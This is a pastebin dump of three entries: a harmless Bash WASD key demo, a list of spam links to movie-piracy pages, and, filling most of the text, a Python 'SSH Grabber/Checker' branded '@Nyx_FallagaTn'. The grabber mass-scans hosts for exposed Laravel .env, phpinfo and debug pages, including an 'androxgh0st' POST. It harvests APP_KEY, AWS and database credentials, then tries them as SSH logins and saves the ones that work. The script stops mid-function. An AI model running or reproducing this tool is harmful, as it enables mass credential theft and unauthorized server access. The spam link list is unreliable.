id,title,username,language,date,content
j6DknUS4,navKey,j0h,Bash,Sunday 28th of May 2023 12:58:46 PM CDT,"#!/bin/bash
#set is used to set variables, and assist in debugging
#set -vx


#keys are wasd
w(){
	clear
echo -e ""Moving Forward\n""
	}

a(){
	clear
echo -e ""Turning Left\n""
	}	
	
s(){
	clear
echo -e ""Going Back\n""
	}
	
d(){
	clear
echo -e ""Turning right\n""
	}

while true; do

echo ""w=go forward a=go left s=back d=go right""
read -rsn1 input
	if [ ""$input"" = ""w"" ]; then 
		w
		elif [ ""$input"" = ""a"" ]; then
		a
		elif [ ""$input"" = ""s"" ]; then 
		s
		elif [ ""$input"" = ""d"" ]; then
		d
		else
		echo -e""something went wrong:\n"" $input
		exit
	fi
done
"
DjSysNZF,stbdertnrd,gadungw71,PHP,Sunday 28th of May 2023 12:21:14 PM CDT,"https://vk.com/@twblurray-the-little-mermaid
https://vk.com/@twblurrayhd-the-little-mermaid-2023-hd
https://vk.com/@twblurrayhd-fast-x-2023-10-hd
https://vk.com/@twblurray-10-fast-x-2023-hd
https://sites.google.com/jonin28.com/thelittlemermaid2023-hd/home
https://sites.google.com/jonin28.com/the-little-mermaid-2023/home
https://sites.google.com/jonin28.com/10fastxhdmoviesonline/home
https://sites.google.com/jonin28.com/fast-x-2023-10-hd/home
https://sites.google.com/movfeed.com/thelittlemermaid20231080p/home
https://sites.google.com/movfeed.com/2023the-little-mermaid-full-hd/home
https://sites.google.com/movfeed.com/fast-x-10-2023/home
https://www.eagleportland.com/group/mysite-231-group/discussion/f9ac7d2d-ac6e-4588-a496-c1c9091eb853
https://www.hoyolab.com/article/18878365
https://vk.com/@movpcinemark-the-little-mermaid-2023-1080-hd-thai
https://vk.com/@mopieboxoffice-th-2023-the-little-mermaid-m-thai-hd
https://zeerotech.us/pirates-of-the-caribbean-the-curse-of-the-black-pearl-unleashing-swashbuckling-magic-on-the-silver-screen/
https://pastelink.net/m2m3skfh
https://ide.geeksforgeeks.org/online-php-compiler/72ba926d-2c72-4b57-99f2-00d6a0d82c4d
https://pasteio.com/xj6t9g2aQBC6
https://dotnetfiddle.net/rT17df
https://onlinegdb.com/pyUPTOTYyv
https://backlinktool.io/p/2CKnofHDyP4hIeOGg6aq.html
https://rextester.com/RHFU27049
https://paste.awesom.eu/saetfbest/msme
https://paste.mozilla.org/P3aThKW2
https://homment.com/LgHLa0flWPPC0F9W8rXR
https://paste.feed-the-beast.com/view/d5584fc1
https://pastehere.xyz/arjmLbp2s/
https://notes.io/qCHWs
https://jsitor.com/Y_pPFnqkiF
https://yamcode.com/safgsehgseh"
nUG1RNSz,pyt,utchiha505,Python,Sunday 28th of May 2023 12:19:21 PM CDT,"import os
import socket
import time
from concurrent.futures import ThreadPoolExecutor
from re import findall as reg
from re import match

import console
import paramiko
import requests
from bs4 import BeautifulSoup as bs

fg = '\033[92m'
fr = '\033[91m'
fw = '\033[97m'
fy = '\033[93m'
fb = '\033[94m'
flc = '\033[96m'
bd = '\u001b[1m'
res = '\u001b[0m'

requests.packages.urllib3.disable_warnings()

chk = False
save = True

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}

headers2 = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}

def ref_eq(inp):
    return str(inp).replace('=',' = ',1)

def url_method_add(url,method,source):
    return 'URL = {}\nMETHOD = {}\n{}'.format(url,method,source)

def remove_cot(inp):
    try:
        rep = reg('= ""(.*?)""',str(inp))[0]
        return str(inp).replace('= ""{}""'.format(rep),'= {}'.format(rep))
    except:
        try:
            rep = reg(""= '(.*?)'"",str(inp))[0]
            return str(inp).replace(""= '{}'"".format(rep),'= {}'.format(rep))
        except:
            pass
    
def reformat_text_phpinfo(source):
    source = bs(source,'html.parser')
    table = source.find_all('table')
    for tab in table:
        if '$_SERVER' in str(tab):
            table = str(tab)
    fields = reg('<td class=""e"">(.*?)</td><td class=""v"">(.*?)</td></tr>',str(table))
    out = ''
    for field in fields:
        e = str(field[0]).split(""['"")[1].split(""']"")[0]
        v = field[1]
        x = '{} = {}'.format(e,v)
        if str(x) not in str(out):
            out += str(x) + '\n'
    return out

def reformat_text_Exception(source):
    source = bs(source,'html.parser')
    out = ''
    table = source.find('div',{'class':'data-table','id':'sg-environment-variables'}).find_all('tr')
    for t in table:
        if '<td>' in str(t):
            all = str(t).replace('\n','')
            name = str(all).split('<tr><td>')[1].split('</td><td>')[0]
            value = str(all).split('</span')[0].split('>')[-1]
            x = '{} = {}'.format(name,value)
            if ('= ""' in str(x) and str(x).endswith('""')) or (""= '"" in str(x) and str(x).endswith(""'"")):
                x = remove_cot(str(x))
            if str(x) not in str(out):
                if str(x).split('=')[1].replace(' ','') != '':
                    out += str(x) + '\n'
    return out

def reformat_text_env(source):
    source = str(source).split('\n')
    source = [source.replace('\r','') for source in source if str(source).replace('\r','') != '' and not(str(source).startswith('#')) and '${' not in str(source)] 
    source = [source for source in source if '=' in str(source) and str(source).split('=')[1] != '']
    out = ''
    for s in source:
        s = ref_eq(str(s))
        if ('= ""' in str(s) and str(s).endswith('""')) or (""= '"" in str(s) and str(s).endswith(""'"")):
            s = remove_cot(str(s))
        if str(s) not in str(out):
            out += s + '\n'
    return out

def reformat_text_config_js(source):
    source = str(source).split('\n')
    out = ''
    for dd in source:
        if ':""' in str(dd):
            name , value = str(dd).split(':',1)
            value = reg('""(.*?)""',str(value))[0]
            if str(value) != '':
                x = '{} = {}'.format(name,value)
                out += str(x) + '\n'
    return out

def reformat_text_js(source):
    source = str(source).split('\n')
    source = [source.replace('const ','') for source in source if str(source).startswith('const')]
    out = ''
    for s in source:
        if ""= '"" in str(s):
            n = str(s).split('=')[0].replace(' ','')
            v = reg(""= '(.*?)';"",str(s))[0]
            out += '{} = {}'.format(n,v) + '\n'
    return out

def debugfixer(source):
    out = ''
    source = bs(source ,'html.parser')
    tags = source.find_all('table',{'class':'data-table'})
    for tag in tags:
        if 'APP_KEY' in str(tag):
            source = tag
    tags = source.find_all('tr')
    for tag in tags:
        try:
            name = reg('<td>(.*?)</td>',str(tag))[0]
            value = str(tag).split('</span')[0].split('"">')[-1].split('</pre')[0].strip()
            s = '{} = {}'.format(name,value)
            if '= ""' in str(s) or ""= '"" in str(s):
                s = remove_cot(str(s))
            if str(s).split('=')[1].replace(' ','') != '':
                if str(s) not in str(out):
                    out += s + '\n'
        except:pass
    return out

def ssh_reformat(text):
    host = ''
    usr = ''
    pwd = ''
    text = str(text).split('\n')
    for line in text:
        if 'url' in str(line).lower():
            host = str(line).split('=')[1].strip()
        elif 'SSH_USERNAME'.lower() in str(line).lower():
            usr = str(line).split('=')[1].strip()
        elif 'SSH_PASSWORD'.lower() in str(line).lower():
            pwd = str(line).split('=')[1].strip()
    text = '{}|{}|{}'.format(host , usr , pwd)
    return text

def get_ssh(source):
    source = str(source).split('\n')
    out = ''
    for s in source:
        x = str(s).split('=')[0]
        if 'DB_USERNAME'.lower() in str(x).lower() or 'DB_PASSWORD'.lower() in str(x).lower():
            out += s + '\n'
    if 'DB_USERNAME'.lower() in str(out).lower() and 'DB_PASSWORD'.lower() in str(out).lower():
        out = str(out).replace('DB_USERNAME','SSH_USERNAME').replace('DB_PASSWORD','SSH_PASSWORD')
        return True , out
    else:
        return False , ''
    
def Extractor(url,method,source):
    if not os.path.isdir('Laravel_Results'):
        os.mkdir('Laravel_Results')
    msg = '{}[\u001b[32;1m+\u001b[0m] {} [ {}{}{} ] '.format(fw,url,fr,method,fw)

    cc = get_ssh(source)
    if cc[0]:
        text = url_method_add(url,method,cc[1])
        if chk:
            print('#====================# SSH #====================#\n')
            print(text)
        if save:
            open('Laravel_Results/SSH.txt','a',errors='ignore').write(text + '\n')
            try:
                open('Laravel_Results/SSH_to_check.txt','a',errors='ignore').write(ssh_reformat(text) + '\n')
            except:
                nyx = ''
        msg += '\u001b[1m\u001b[42;1m SSH \u001b[0m '

    if str(msg)[-2] == ']':
        msg += ""[ {}Couldn't Get Anything{} ]"".format(fr,fw)

    print(msg)

def env(url):
    method = '/.env'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower()):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower():
                req = reformat_text_env(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def env_save(url):
    method = '/.env.save'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower() ):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower():
                req = reformat_text_env(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def env_php(url):
    method = '/.env.php'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower() ):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower():
                req = reformat_text_env(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                            print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                            print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def beta_env(url):
    method = '/beta/.env'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower() ):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower():
                req = reformat_text_env(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def prod_env(url):
    method = '/prod/.env'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower() ):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower():
                req = reformat_text_env(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_env(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def env_js(url):
    method = '/env.js'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower() ):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_js(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower():
                req = reformat_text_js(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = reformat_text_js(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def debug(url):
    method = 'DEBUG'
    
    try:
        req = requests.post('http://{}'.format(url),data={""0x[]"":""androxgh0st""},headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower()):
            req = requests.post('https://{}'.format(url),data={""0x[]"":""androxgh0st""},headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = debugfixer(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower():
                req = debugfixer(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.post('https://{}'.format(url),data={""0x[]"":""androxgh0st""},headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower():
                    req = debugfixer(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def config_js(url):
    method = '/config.js'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        req = str(req).replace(' ','')
        if '={' in str(req):
            req = str(req).replace('\n','')
            req = reg('={(.*?)}',str(req))
            for d in req:
                if 'aws' in str(d).lower():
                    req = d
                    break
            req = str(req).replace(',',',\n')
            if not('APP_KEY' in str(req) or 'aws' in str(req).lower()):
                req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
                req = str(req).replace(' ','')
                if '={' in str(req):
                    req = str(req).replace('\n','')
                    req = reg('={(.*?)}',str(req))
                    for d in req:
                        if 'aws' in str(d).lower():
                            req = d
                            break
                    req = str(req).replace(',',',\n')
                    if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                        if 'exception' not in str(req).lower():
                            req = reformat_text_config_js(req)
                            if str(req).replace('\n','').replace(' ','') != '':
                                if chk:
                                    print(req)
                                Extractor(url,method,req)
                                return True
                        else:
                            req = reformat_text_Exception(req)
                            if str(req).replace('\n','').replace(' ','') != '':
                                if chk:
                                    print(req)
                                Extractor(url,method,req)
                                return True
            else:
                if 'exception' not in str(req).lower():
                    req = reformat_text_config_js(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            req = str(req).replace(' ','')
            if '={' in str(req):
                req = str(req).replace('\n','')
                req = reg('={(.*?)}',str(req))
                for d in req:
                    if 'aws' in str(d).lower():
                        req = d
                        break
                req = str(req).replace(',',',\n')
                if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                    if 'exception' not in str(req).lower():
                        req = reformat_text_config_js(req)
                        if str(req).replace('\n','').replace(' ','') != '':
                            if chk:
                                print(req)
                            Extractor(url,method,req)
                            return True
                    else:
                        req = reformat_text_Exception(req)
                        if str(req).replace('\n','').replace(' ','') != '':
                            if chk:
                                print(req)
                            Extractor(url,method,req)
                            return True
        except:
            pass
    return False
    
def phpinfo(url):
    method = '/phpinfo'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower() ):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower() or 'http://www.php.net/' in str(req).lower():
                    req = reformat_text_phpinfo(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower() or 'http://www.php.net/' in str(req).lower():
                req = reformat_text_phpinfo(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower() or 'http://www.php.net/' in str(req).lower():
                    req = reformat_text_phpinfo(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False
    
def phpinfo_php(url):
    method = '/phpinfo.php'
    
    try:
        req = requests.get('http://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
        if not('APP_KEY' in str(req) or 'aws' in str(req).lower() ):
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower() or 'http://www.php.net/' in str(req).lower():
                    req = reformat_text_phpinfo(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        else:
            if 'exception' not in str(req).lower() or 'http://www.php.net/' in str(req).lower():
                req = reformat_text_phpinfo(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
            else:
                req = reformat_text_Exception(req)
                if str(req).replace('\n','').replace(' ','') != '':
                    if chk:
                        print(req)
                    Extractor(url,method,req)
                    return True
    except:
        try:
            req = requests.get('https://{}{}'.format(url,method),headers=headers,timeout=8,verify=False,allow_redirects=False).text
            if 'APP_KEY' in str(req) or 'aws' in str(req).lower() :
                if 'exception' not in str(req).lower() or 'http://www.php.net/' in str(req).lower():
                    req = reformat_text_phpinfo(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
                else:
                    req = reformat_text_Exception(req)
                    if str(req).replace('\n','').replace(' ','') != '':
                        if chk:
                            print(req)
                        Extractor(url,method,req)
                        return True
        except:
            pass
    return False

def laravel_check(url):
    if not env(url):
        if not env_save(url):
            if not env_php(url):
                if not beta_env(url):
                    if not prod_env(url):
                        if not env_js(url):
                            if not debug(url):
                                if not phpinfo(url):
                                    if not phpinfo_php(url):
                                        print(""{}[\u001b[32;1m+\u001b[0m] {} [ {}Couldn't Find Anything{} ] "".format(fw,url,fr,fw))
                                        return False

def Laravelnyx():
    lista = list(x.strip() for x in open(input('{}[{}+{}] List : '.format(fw,fg,fw)),'r',errors='ignore').readlines())
    try:
        ThreadPoolExecutor(100).map(laravel_check,lista)
    except Exception as e:
        print(e)
        pass


#################################################################################

def login_ssh(string):
    host , username , password = str(string).split('|',2)
    cnx = False
    check_ip = match(r""^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"",host)
    if not check_ip:
        host = socket.gethostbyname(host)
    try:
        client = paramiko.client.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=username, password=password)
        cnx = True
        _stdin, _stdout,_stderr = client.exec_command('ls')
        res = _stdout.read().decode()
        if 'Invalid argument' not in str(res):
            if cnx:
                open('SSH_success.txt','a',errors='ignore').write('{}|{}|{}'.format(host,username,password) + '\n')
                print('{}[ SUCCESS ]{} {}'.format(fg,fw,host))
            else:
                print('{}[ BAD ]{} {}'.format(fr,fw,host))
            client.close()
        else:
            print('{}[ BAD ]{} {}'.format(fr,fw,host))
    except:
        print('{}[ BAD ]{} {}'.format(fr,fw,host))
        pass

def check_ssh():
    lista = open(input('{}[{}!{}]{} List : '.format(flc,fr,flc,fw)), 'r').read().splitlines()
    try:
        ThreadPoolExecutor(10).map(login_ssh ,lista)
    except:
        pass

def oni():
    msg = """"""{}     ⣰⡆                      ⠐⣆           \    ⣴⠁⡇    {}@Nyx_FallagaTn{}    ⢀⠃⢣           \    ⢻ ⠸⡀                     ⡜ ⢸⠇           \    ⠘⡄⢆⠑⡄     ⢀⣀⣀⣠⣄⣀⣀⡀     ⢀⠜⢠⢀⡆           \     ⠘⣜⣦⠈⢢⡀⣀⣴⣾⣿⡛⠛⠛⠛⠛⠛⡿⣿⣦⣄ ⡠⠋⣰⢧⠎           \      ⠘⣿⣧⢀⠉⢻⡟⠁⠙⠃    ⠈⠋ ⠹⡟⠉⢠⢰⣿⠏           \       ⠘⣿⡎⢆⣸⡄          ⠠⣿⣠⢣⣿⠏           \       ⡖⠻⣿⠼⢽            ⢹⠹⣾⠟⢳⡄           \       ⡟⡇⢨ ⢸⡀           ⡎ ⣇⢠⢿⠇           \       ⢹⠃⢻⡤⠚    {}⣀  ⢀{}    ⠙⠢⡼ ⢻           \       ⠸⡓⡄{}⢹⠦⠤⠤⠤⢾⣇  ⢠⡷⠦⠤⠤⠴⢺{}⢁⠔⡟           \       ⢠⠁⣷{}⠈⠓⠤⠤⠤⣞⡻  ⢸⣱⣤⠤⠤⠔⠁{}⣸⡆⣇           \       ⠘⢲⠋⢦⣀⣠⢴⠶ {}⠁  ⠈⠁{}⠴⣶⣄⣀⡴⠋⣷⠋           \        ⣿⡀  ⢀⡘⠶⣄⡀   ⣠⡴⠞⣶ ⢀ ⣼           \        ⠈⠻⣌⢢⢸⣷⣸⡈⠳⠦⠤⠞⠁⣷⣼⡏⣰⢃⡾⠋           \          ⠙⢿⣿⣿⡇⢻⡶⣦⣤⡴⡾⢸⣿⣿⣷⠏           \            ⢿⡟⡿⡄⣳⣤⣤⣴⢁⣾⠏⡿⠁           \            ⠈⣷⠘⠒⠚⠉⠉⠑⠒⠊⣸⠇           \             ⠈⠳⠶⠔⠒⠒⠲⠴⠞⠋{}           \ """""".format(fg,fr,fg,fr,fg,fr,fg,fr,fg,fr,fg,fw)
    line = ''
    lines = []
    for i in msg:
        if str(i) == '\\':
            lines.append(line)
            line = ''
        else:
            line += str(i)
    maxlen = 0
    for line in lines:
        if int(len(line)) > maxlen:
            maxlen = int(len(line))
    for line in lines:
        while int(len(line)) < maxlen:
            line += ' '
        print(str(line).center(os.get_terminal_size().columns , "" ""))
        # time.sleep(0.12)

def main():
    oni()
    print('\n')
    print('[ 1 ] SSH Grabber')
    print('[ 2 ] SSH Checker')
    print('\n')
    choice = input('{}[{}#{}] Nyx{}@{}Choice : '.format(fw,fg,fw,fy,fw))
    match choice:
